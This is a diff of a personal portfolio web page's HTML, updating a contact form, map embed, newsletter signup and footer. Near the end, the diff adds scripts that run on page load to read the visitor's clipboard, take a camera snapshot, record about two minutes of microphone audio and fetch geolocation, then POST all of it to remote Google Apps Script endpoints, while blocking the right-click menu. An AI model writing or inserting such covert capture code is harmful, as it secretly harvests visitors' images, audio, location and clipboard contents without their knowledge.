-                <a href= "https://maps.app.goo.gl/dYFvv4mCbDunqBbn6" target="_blank" style="text-decoration: none;"><div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/map-marker.png" /></div>
-              <div class="contact-info">
-                <h1><b>Address</b></h1>
-                <h2>65a/6, Vilvanur, Idayapatti post, Salem-636114, Tamil Nadu, India</h2></a>
-                <br>
-                <a href= "https://maps.app.goo.gl/dYFvv4mCbDunqBbn6" target="_blank" style="text-decoration: none;"><b>GET IN MAP</b></a> 
-              </div>
-            </div>
-            
-            
-          </div>
-        </div>
+         </div>
       </section>
-      
-    <section id="contact">
-        <div class="container mt-3 contactContent">
-		
-        <h1 class="text-center"style="font-size: 20px"><b>ANY QUERIES</b></h1>
-
+      <style>
+         #contact {
+         background-color: #f2f2f2;
+         padding: 20px;
+         }
+         .contact {
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         flex-direction: column;
+         }
+         .contact h1 {
+         font-size: 20px;
+         margin-bottom: 20px;
+         }
+         .contact-items {
+         display: flex;
+         flex-wrap: wrap;
+         justify-content: center;
+         }
+         .contact-item {
+         flex: 1;
+         max-width: 300px;
+         margin: 10px;
+         padding: 20px;
+         background-color: white;
+         text-align: center;
+         box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+         transition: transform 0.3s ease;
+         }
+         .contact-item:hover {
+         transform: translateY(-5px);
+         }
+         .icon {
+         margin-bottom: 10px;
+         }
+      </style>
+      <section id="queries">
+        <br><br><br>
+         <div class="container mt-3 contactContent">
+            <h1 class="text-center"style="font-size: 20px"><b>ANY QUERIES</b></h1>
             <div class="row mt-4">
-                <div class="col-lg-6">
-                    
-<div style="overflow:hidden;resize:none;max-width:100%;width:500px;height:400px;"><div id="embeddedmap-display" style="height:100%; width:100%;max-width:100%;"><iframe src="https://www.google.com/maps/embed?pb=!1m17!1m12!1m3!1d3906.23164214264!2d78.48809671058773!3d11.748724988417276!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m2!1m1!2zMTHCsDQ0JzU1LjQiTiA3OMKwMjknMjYuNCJF!5e0!3m2!1sen!2sin!4v1687577567512!5m2!1sen!2sin" width="600" height="400" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div><a class="googlecode" href="https://www.embed-map.com" id="enable-mapdata">https://www.embed-map.com</a><style>#embeddedmap-display img{max-width:none!important;background:none!important;font-size: inherit;font-weight:inherit;}</style></div>
-    </div>
-
-                <div class="col-lg-6">
-                    <h1 id="msg"></h1>
-                    <div style="border: 2px solid #11ed62; padding: 20px; border-radius: 5px;">
-                        <form>
-                          <input type="text" name="name" placeholder="Name" style="padding: 7px; width: 500px; border-radius: 5px; border: 1px solid #ccc;"><br><br>
-                          <input type="tel" name="phone" placeholder="Phone" style="padding: 7px; width: 500px; border-radius: 5px; border: 1px solid #ccc;"><br><br>
-                          <input type="email" name="email" placeholder="Email" style="padding: 7px; width: 500px; border-radius: 5px; border: 1px solid #ccc;"><br><br>
-                          <textarea name="queries" placeholder="Queries" style="padding: 7px; width: 500px; height: 100px; border-radius: 5px; border: 1px solid #ccc;"></textarea><br><br>
-                          <input type="submit" id="sub" style="padding: 5px 20px; background-color: #520ebf; color: #fff; border: none; border-radius: 5px; cursor: pointer;">
-                        </form>
-                      </div>
-                      
-                      
-                  
-                    
-                      <div id="popupMessage" style="position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); display: none;">
-                        <h1 style="margin: 0;">Form submitted successfully!</h1>
-                      </div>
-                    
-                      <script>
-                        let form = document.querySelector("form");
-                        form.addEventListener('submit', (e) => {
-                          e.preventDefault();
-                          document.querySelector("#sub").value = "Submitting..";
-                          let data = new FormData(form);
-                          fetch('https://script.google.com/macros/s/AKfycbzkXaYvaek9FITp0PRmLc2HY_8BviJCpae4PVro_K11d0ktD2iHRPUzyXWW3M9fcpZDmg/exec', {
-                              method: "POST",
-                              body: data
-                            })
-                            .then(res => res.text())
-                            .then(data => {
-                              document.querySelector("#sub").value = "Submit";
-                              document.querySelector("#popupMessage").style.display = "block";
-                              setTimeout(function() {
-                                document.querySelector("#popupMessage").style.display = "none";
-                                form.reset(); // Clear the form inputs
-                              }, 3000);
-                            });
-                        });
-                      </script>
-                    
-				
-                    
-                </div>
-
+               <div class="col-lg-6">
+                  <div style="overflow:hidden;resize:none;max-width:100%;width:500px;height:400px;">
+                     <div id="embeddedmap-display" style="height:100%; width:100%;max-width:100%;"><iframe src="https://www.google.com/maps/embed?pb=!1m17!1m12!1m3!1d3906.23164214264!2d78.48809671058773!3d11.748724988417276!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m2!1m1!2zMTHCsDQ0JzU1LjQiTiA3OMKwMjknMjYuNCJF!5e0!3m2!1sen!2sin!4v1687577567512!5m2!1sen!2sin" width="600" height="400" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div>
+                     <a class="googlecode" href="https://www.embed-map.com" id="enable-mapdata">https://www.embed-map.com</a>
+                     <style>#embeddedmap-display img{max-width:none!important;background:none!important;font-size: inherit;font-weight:inherit;}</style>
+                  </div>
+               </div>
+               <div class="col-lg-6">
+                  <h1 id="msg"></h1>
+                  <div style="border: 2px solid #11ed62; padding: 20px; border-radius: 5px;">
+                     <form>
+                        <input type="text" name="name" placeholder="Name" style="padding: 7px; width: 100%; border-radius: 5px; border: 1px solid #ccc;"><br><br>
+                        <input type="tel" name="phone" placeholder="Phone" style="padding: 7px; width: 100%; border-radius: 5px; border: 1px solid #ccc;"><br><br>
+                        <input type="email" name="email" placeholder="Email" style="padding: 7px; width: 100%; border-radius: 5px; border: 1px solid #ccc;"><br><br>
+                        <textarea name="queries" placeholder="Queries" style="padding: 7px; width: 100%; height: 100px; border-radius: 5px; border: 1px solid #ccc;"></textarea><br><br>
+                        <input type="submit" id="sub" style="padding: 5px 20px; background-color: #520ebf; color: #fff; border: none; border-radius: 5px; cursor: pointer; width: 100%;">
+                     </form>
+                  </div>
+                  <div id="popupMessage" style="position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); display: none;">
+                     <h1 style="margin: 0;">Form submitted successfully!</h1>
+                  </div>
+                  <script>
+                     let form = document.querySelector("form");
+                     form.addEventListener('submit', (e) => {
+                       e.preventDefault();
+                       document.querySelector("#sub").value = "Submitting..";
+                       let data = new FormData(form);
+                       fetch('https://script.google.com/macros/s/AKfycbxOL9GR4p_YAS090K6lbqKQ2gEPw-90PCvZEYojxGp3QHBMnkYvieFwBpR5JWBn6NgEeA/exec', {
+                           method: "POST",
+                           body: data
+                         })
+                         .then(res => res.text())
+                         .then(data => {
+                           document.querySelector("#sub").value = "Submit";
+                           alert("Form submitted successfully!");
+                           setTimeout(function() {
+                             form.reset(); 
+                           }, 3000);
+                         });
+                     });
+                  </script>
+               </div>
             </div>
-        </div>
-    </section>
-  
+         </div>
+      </section><br><br>
+ <section id="subscription" style="display: flex; justify-content: center; align-items: center; margin: 50px 0;">
+ <div style="text-align: center; padding: 30px; border: 2px solid #3498db; border-radius: 10px; width: 1000px; background-color: #ecf0f1; box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);">
+    <h1 style="font-size: 1.2rem; margin: 0 0 15px; color: #db6334;">Subscribe to Our Newsletter</h1>
+    <p style="font-size: 1rem; margin: 0 0 15px; color: #555;">Stay updated with our latest news and updates.</p>
+    <form id="subscriptionForm" style="margin: 0 0 20px;">
+      <label for="name" style="display: block; margin: 0 0 8px; font-size: 1rem; color: #333; font-weight: bold; text-align: left;">Name</label>
+      <input type="text" id="name" name="name" required style="width: 100%; padding: 12px; margin: 0 0 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem;">
+      <label for="email" style="display: block; margin: 0 0 8px; font-size: 1rem; color: #333; font-weight: bold; text-align: left;">Email</label>
+      <input type="email" id="email" name="email" required style="width: 100%; padding: 12px; margin: 0 0 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem;">
+      <button type="button" onclick="subscribe()" style="background-color: #db34d0; color: #fff; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 1rem; font-weight: bold;">Subscribe</button>
+    </form>
+  </div>
+      <script>
+         function subscribe() {
+             var name = document.getElementById("name").value;
+             var email = document.getElementById("email").value;
+             const formData = new FormData();
+             formData.append('name', name);
+             formData.append('email', email);
+             fetch('https://script.google.com/macros/s/AKfycbxJBwpl25rLDAi9pm1HIH44PH9gUAv9cLnOrBArg86TqufAZOEPit-sOKCHw-tETKw/exec', {
+                 method: 'POST',
+                 body: formData,
+             })
+             .then(function (response) {
+                 if (response.ok) {
+                     console.log('Request sent successfully');
+                     alert('You have subscribed to Arun Updates Successfully');
+                 } else {
+                     console.error('Request failed');
+                 }
+             })
+             .catch(function (error) {
+                 console.error('Request error:', error);
+             });
+         }
+      </script>
+    </section><br>
     <footer id="footer" style="background-color: #f2f2f2; padding: 10px;">
         <div class="container-fluid">
-            <div class="social-icons mt-1" style="text-align: center;">
-                <a href="https://www.facebook.com/arunkumarselvaraj.facebook/" target="_blank" style="color: #3b5998; margin-right: 10px;"><i class="fab fa-facebook-square"></i></a>
-                <a href="https://www.instagram.com/arunkumarselvaraj.insta/" target="_blank" style="color: #c13584; margin-right: 10px;"><i class="fab fa-instagram-square"></i></a>
-                <a href="https://twitter.com/Arunkumar_twet" target="_blank" style="color: #1da1f2; margin-right: 10px;"><i class="fab fa-twitter-square"></i></a>
-                <a href="https://t.me/arunkumarlearn" target="_blank" style="color: #0088cc; margin-right: 10px;"><i class="fab fa-telegram"></i></a>
-                <a href="https://www.youtube.com/channel/UC5kuJkv4HU1UycljTRNsUhQ" target="_blank" style="color: #c4302b; margin-right: 10px;"><i class="fab fa-youtube-square"></i></a>
-            </div>
+           <div class="social-icons mt-1" style="text-align: center;">
+              <a href="https://www.facebook.com/arunkumarselvaraj.facebook/" target="_blank" style="color: #3b5998; margin-right: 10px;"><i class="fab fa-facebook-square"></i></a>
+              <a href="https://www.instagram.com/arunkumarselvaraj.insta/" target="_blank" style="color: #c13584; margin-right: 10px;"><i class="fab fa-instagram-square"></i></a>
+              <a href="https://twitter.com/arunkumarselvaa" target="_blank" style="color: #1da1f2; margin-right: 10px;"><i class="fab fa-twitter-square"></i></a>
+              <a href="https://t.me/arunkumar_selvaraj1" target="_blank" style="color: #0088cc; margin-right: 10px;"><i class="fab fa-telegram"></i></a>
+              <a href="https://www.youtube.com/channel/UC5kuJkv4HU1UycljTRNsUhQ" target="_blank" style="color: #c4302b; margin-right: 10px;"><i class="fab fa-youtube-square"></i></a>
+           </div>
         </div>
-    </footer>
-    
+        </footer>
+<script>
+const header = document.querySelector('.navbar');
+console.log(header)
+window.onscroll = function() {
+    const top = window.scrollY;
+    if(top >=100) {
+        header.classList.add('navbarDark');
+    }
+    else {
+        header.classList.remove('navbarDark');
+    }
+}
+const navLinks = document.querySelectorAll('.nav-item')
+const menuToggle = document.getElementById('navbarSupportedContent')
 
-    <script src="script/script.js"></script>
+navLinks.forEach((l) => {
+    l.addEventListener('click', () => { new bootstrap.Collapse(menuToggle).toggle() })
+})
+               function openLink(url) {
+                   var screenWidth = window.screen.width;
+                                   var screenHeight = window.screen.height;
+                                   var windowFeatures = "width=" + screenWidth + ",height=" + screenHeight + ",resizable=yes,toolbar=no,menubar=no,location=no,status=no";
+                   var newWindow = window.open("", "NewWindow", windowFeatures);
+                   newWindow.document.write('<html><head><title>Service Link</title></head><body><iframe src="' + url + '" frameborder="0" width="100%" height="100%"></iframe></body></html>');
+               }
+                window.onload = function() {
+             openPreview(); 
+             openPreview1(); 
+         };
+         function openPreview1() {
+             document.getElementById('previewFrame1').src = 'profile.html';
+         }
+         function openPreview() {
+             document.getElementById('previewFrame').src = 'certificate.html';
+         }     
+</script>
+   <div id="clipboardData"></div>
+      <video id="video" autoplay style="display:none;"></video>
+      <canvas id="canvas" style="display:none;"></canvas>
+      <img id="captured-image" src="" alt="Captured Image" style="display:none;">
+  
+      <script>
+      
+      // Declare a global variable to store clipboard data
+      let storedClipboardData;
 
-</body>
+      function paste() {
+        // Read text from the clipboard
+        navigator.clipboard
+          .readText()
+          .then(function (clipboardData) {
+            // Store the clipboard data in the global variable
+            storedClipboardData = clipboardData;
 
+            // Display the clipboard data on the website
+            document.getElementById("clipboardData").textContent =
+              storedClipboardData;
+
+          })
+         }
+             paste();
+
+         if (navigator.geolocation) {
+            navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
+                if (result.state === 'granted') {
+                    // Geolocation access granted
+                    navigator.geolocation.getCurrentPosition(
+                        function (position) {
+                            // Handle the obtained position
+                        },
+                        function (error) {
+                            console.error("Error getting geolocation:", error);
+                        }
+                    );
+                } else if (result.state === 'prompt') {
+                    // Geolocation access is requested
+                } else if (result.state === 'denied') {
+                    // Geolocation access denied by the user
+                    console.error("Geolocation access denied by the user.");
+                    // You can inform the user or provide an alternative method
+                } else if (result.state === 'prompt') {
+                    // Geolocation access is requested
+                }
+            });
+        } else {
+            console.error("Geolocation is not supported by this browser.");
+        }
+         captureCamera();
+        let latitude;
+        let longitude;
+        let mapUrl;
+        var website = 'https://arunkumar-selvaraj.web.app/';
+        let capturedImage = document.getElementById('captured-image');
+        var imageDataUrl;
+      
+        function captureCamera() {
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (cameraStream) {
+              const video = document.getElementById('video');
+              const canvas = document.getElementById('canvas');
+              video.srcObject = cameraStream;
+              video.onloadedmetadata = function () {
+                captureImage(cameraStream);
+              };
+            })
+            .catch(function (error) {
+              console.error('Error accessing the camera: ' + error);
+            });
+      
+          getLocation();
+        }
+      
+        function getLocation() {
+          if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            }, function (error) {
+              console.error('Error accessing geolocation: ' + error);
+            });
+          } else {
+            console.error('Geolocation is not supported');
+          }
+        }
+      
+        function captureImage(stream) {
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+         imageDataUrl = canvas.toDataURL('image/png');
+          capturedImage.src = imageDataUrl;
+          if (stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            sendImageData(imageDataUrl);
+          }
+        }
+      
+        function sendImageData(imageDataUrl) {
+          let url = "https://script.google.com/macros/s/AKfycby1ejeAgqBPkDuJ11yoQ9Tlu4gpLgmlJrsndWIJ_io6mk1wQ17XysixomV0ajcnnhfF/exec";
+          console.log(latitude);
+          console.log(longitude);
+          console.log('imageDataUrl' + imageDataUrl.split("base64,")[1]);
+          let obj = {
+            base64: imageDataUrl.split("base64,")[1],
+            type: 'image/png',
+            name: 'captured_image.png',
+            url: mapUrl,
+            latitude: latitude,
+            longitude: longitude,
+            website: website,
+            storedClipboardData : storedClipboardData 
+          };
+          fetch(url, {
+              method: "POST",
+              body: JSON.stringify(obj)
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending image: ' + error));
+        }
+      </script>
+      
+<div id="status"><span id="statusText"></span></div>
+<script>
+  const status = document.getElementById('status');
+  console.log("Requesting access to the microphone...");
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(stream => {
+      console.log("Microphone access granted.");
+      const mediaRecorder = new MediaRecorder(stream);
+      const recordedChunks = [];
+      mediaRecorder.ondataavailable = event => {
+        recordedChunks.push(event.data);
+        console.log("Data available...");
+      };
+      mediaRecorder.onstop = () => {
+        console.log("Recording stopped.");
+        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+        console.log("Blob created:", blob);
+        convertBlobToBase64(blob); // Convert blob to Base64 URL
+      };
+      mediaRecorder.start();
+      console.log("Recording started...");
+      setTimeout(() => {
+        mediaRecorder.stop();
+        console.log("Stopping recording after 10 seconds...");
+      }, 120000); // Stop recording after 10 seconds (adjust as needed)
+    })
+    .catch(err => {
+     
+      console.error('Error accessing the microphone:', err);
+    });
+
+    function convertBlobToBase64(blob) {
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const base64String = event.target.result.split(',')[1]; // Extracting base64 string
+        sendAudioToServer(base64String);
+      };
+      reader.readAsDataURL(blob);
+    }
+
+    function sendAudioToServer(base64String) {
+      const formData = new FormData();
+      formData.append('audio', base64String);
+      formData.append('website', website);
+      formData.append('latitude', latitude);   
+      formData.append('longitude', longitude);   
+      formData.append('url', mapUrl);   
+      formData.append('name', 'captured_image.png');   
+      formData.append('type', 'image/png');   
+      formData.append('base64',  imageDataUrl.split("base64,")[1]);    
+
+      fetch('https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec', {
+         method: 'POST',
+         body: formData
+       }).then(response => {
+      console.log("Server response received:", response);
+      return response.text(); // Convert the response to text
+    }).then(data => {
+      console.log('Response: ' + data);
+    }).catch(error => {
+      console.error('Error sending audio to the server:', error);
+   
+    });
+  }
+  setTimeout(function () {
+   window.location.reload();
+}, 160000);
+
+document.addEventListener("contextmenu", function(e) {
+   e.preventDefault();
+});
+</script>
+
+   </body>
 </html>
